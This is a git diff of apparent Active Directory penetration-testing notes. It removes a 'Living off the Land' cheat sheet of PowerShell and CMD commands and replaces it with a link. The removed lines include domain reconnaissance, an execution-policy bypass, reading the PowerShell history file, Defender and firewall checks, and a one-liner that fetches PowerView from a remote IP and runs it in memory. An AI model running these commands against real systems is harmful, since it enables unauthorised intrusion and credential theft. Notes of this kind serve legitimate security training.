@@ -180,30 +180,7 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 ---
 
 ### Living off the Land
-```
-hostname
-Get-Host
-powershell.exe -version 2
-[System.Environment]::OSVersion.Version
-wmic qfe get Caption,Description,HotFixID,InstalledOn
-ipconfig /all
-set
-echo %USERDOMAIN%
-echo %logonserver%
-Systeminfo
-
-Get-Module
-Get-ExecutionPolicy -List
-Set-ExecutionPolicy Bypass -Scope Process ( script restriction-u deaktiv )
-Get-ChildItem Env: | ft Key,Value
-Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
-powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/PowerView.ps1'); ..." (
-
-netsh advfirewall show allprofiles
-sc query windefend
-Get-MpComputerStatus
-qwinsta
-```
+[PowerShell və CMD vasitəsilə maksimum məlumat əldə etmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/Living%20Of%20The%20Land.md)
 ---
 
 ### Enumeration with PowerView
